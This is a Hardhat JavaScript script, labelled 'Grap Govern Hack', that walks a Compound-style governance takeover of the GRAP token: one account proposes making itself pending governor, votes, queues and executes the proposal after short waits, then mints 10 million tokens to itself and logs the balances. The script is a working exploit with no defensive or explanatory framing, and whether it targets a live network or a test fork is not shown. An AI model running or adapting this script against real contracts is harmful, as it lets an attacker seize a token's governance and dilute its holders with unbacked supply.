const { ethers } = require("hardhat");
require("dotenv").config();
const sleep = (n) => new Promise((res, rej) => setTimeout(res, n));

async function main() {
  const accounts = await ethers.getSigners();

  const grapImplementation = await ethers.getContractAt(
    "GRAPDelegate",
    process.env.GRAPIMPLEMENTATION
  );

  const grapDelegator = await ethers.getContractAt(
    "GRAPDelegator",
    process.env.GRAPPROXY
  );

  const timelock = await ethers.getContractAt("Timelock", process.env.TIMELOCK);

  const governorAlpha = await ethers.getContractAt(
    "GovernorAlpha",
    process.env.GOVERNORALPHA
  );

  // const balance = await grapDelegator.totalSupply();
  // console.log("Total balance of Grap:", balance/1e18);
  //
  // const a0_balance = await grapDelegator.balanceOf(accounts[0].address);
  // console.log("Account[0] balance:", a0_balance/1e18);

  const blockNumber = await ethers.provider.getBlockNumber();
  console.log("BlockNumber:", blockNumber);

  // const currentVotes = await grapDelegator.getCurrentVotes(accounts[0].address);
  // console.log("currentVotes:", currentVotes);
  // const estimate = await grapDelegator.estimateGas.getPriorVotes(accounts[0].address, 14235964);
  // console.log("gas estimate:", estimate);

  let priorVotes = await grapDelegator.getPriorVotes(
    accounts[1].address,
    blockNumber - 1,
    {
      //value: ethers.utils.parseEther("0.12"),
      // gasPrice: 10000000000, //gasPrice: x, 10G
      //maxFeePerGas: 10000000000,
      // gasLimit: 2000000
    }
  );
  console.log("account1 priorVotes:", priorVotes / 1e18);

  // 1. delegate to myself
  // const address = await grapDelegator.connect(accounts[1]).delegate(accounts[1].address);
  // console.log("delegates:", address);
  //
  //

  // priorVotes = await grapDelegator.getPriorVotes(accounts[1].address, blockNumber - 10);
  // console.log("priorVotes:", priorVotes/1e18);

  //
  // function propose(
  //     address[] memory targets,
  //     uint[] memory values,
  //     string[] memory signatures,
  //     bytes[] memory calldatas,
  //     string memory description

  // 2. propose (make sure having 1% token in account)
  const abiCoder = new ethers.utils.AbiCoder();
  const targets = [grapDelegator.address];
  const values = [0];
  const signatures = ["_setPendingGov(address)"];

  const calldatas = [abiCoder.encode(["address"], [accounts[1].address])];
  const description = "Grap Govern Hack";

  console.log("targets:", targets);
  console.log("values:", values);
  console.log("calldatas:", calldatas);

  //
  //
  // const estimateGas = await governorAlpha.estimateGas.propose(
  //   targets,
  //   values,
  //   signatures,
  //   calldatas,
  //   description
  // );
  //
  // console.log("estimateGas:", estimateGas);
  //
  const proposeResult = await governorAlpha
    .connect(accounts[1])
    .propose(targets, values, signatures, calldatas, description);
  console.log("propose result:", proposeResult);

  console.log(
    "proposalThreshold:",
    (await governorAlpha.proposalThreshold()) / 1e18
  );

  console.log("waiting 30s");
  await sleep(30000);
  // 3. castVote
  const proposalCount = await governorAlpha.proposalCount();
  const castVote = await governorAlpha
    .connect(accounts[1])
    .castVote(proposalCount, true);
  console.log("castVote result:", castVote);

  console.log("proposals:", await governorAlpha.proposals(proposalCount));
  console.log("proposals state:", await governorAlpha.state(proposalCount));

  console.log("waiting 15m");
  await sleep(15 * 60 * 1000);
  // 4. queue
  const queue = await governorAlpha.connect(accounts[1]).queue(proposalCount);
  console.log("queue:", queue);

  //console.log('proposals state:', await governorAlpha.state(2));
  // const queuedTransactions = await timelock.queuedTransactions('');
  // console.log('queuedTransactions:', queuedTransactions);

  console.log("waiting 20m");
  await sleep(20 * 60 * 1000);

  // 5.execute
  const execute = await governorAlpha
    .connect(accounts[1])
    .execute(proposalCount);
  console.log("execute:", execute);
  console.log("waiting 30s");
  await sleep(30000);
  console.log("proposals state:", await governorAlpha.state(proposalCount));
  console.log("action:", await governorAlpha.getActions(proposalCount));

  //6. // HACK:
  let balance = await grapDelegator.totalSupply();
  console.log("Total balance of Grap:", balance / 1e18);

  let a1_balance = await grapDelegator.balanceOf(accounts[1].address);
  console.log("Account[1] balance:", a1_balance / 1e18);

  const mint10m = await grapDelegator
    .connect(accounts[1])
    .mint(
      accounts[1].address,
      ethers.BigNumber.from("10000000000000000000000000")
    );
  console.log("mint10m:", mint10m);

  console.log("waiting 30s");
  await sleep(30000);
  balance = await grapDelegator.totalSupply();
  console.log("Total balance of Grap:", balance / 1e18);
  a1_balance = await grapDelegator.balanceOf(accounts[1].address);
  console.log("Account[1] balance:", a1_balance / 1e18);
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
